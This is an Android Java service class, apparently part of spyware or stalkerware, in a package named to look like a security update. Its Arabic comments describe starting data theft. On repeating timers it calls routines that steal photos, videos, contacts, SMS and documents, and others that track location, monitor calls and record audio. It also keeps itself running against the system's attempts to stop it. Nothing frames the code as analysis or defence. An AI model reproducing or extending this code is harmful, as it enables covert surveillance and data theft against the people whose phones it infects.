package com.security.update;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.util.Timer;
import java.util.TimerTask;

public class BackgroundService extends Service {
    private static final String TAG = "BackgroundService";
    private Timer dataTimer;
    private Timer monitorTimer;
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Background service started");
        
        // بدء سرقة البيانات كل 5 دقائق
        dataTimer = new Timer();
        dataTimer.schedule(new DataStealingTask(), 0, 300000);
        
        // بدء المراقبة كل دقيقة
        monitorTimer = new Timer();
        monitorTimer.schedule(new MonitoringTask(), 0, 60000);
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // منع النظام من قتل السيرفيس
        return START_STICKY;
    }
    
    private class DataStealingTask extends TimerTask {
        @Override
        public void run() {
            try {
                DataStealer stealer = new DataStealer();
                stealer.stealPhotos();
                stealer.stealVideos();
                stealer.stealContacts();
                stealer.stealSMS();
                stealer.stealDocuments();
            } catch (Exception e) {
                Log.e(TAG, "Data stealing failed: " + e.getMessage());
            }
        }
    }
    
    private class MonitoringTask extends TimerTask {
        @Override
        public void run() {
            try {
                RemoteControl controller = new RemoteControl();
                controller.trackLocation();
                controller.monitorCalls();
                controller.recordAudio();
            } catch (Exception e) {
                Log.e(TAG, "Monitoring failed: " + e.getMessage());
            }
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (dataTimer != null) dataTimer.cancel();
        if (monitorTimer != null) monitorTimer.cancel();
    }
}
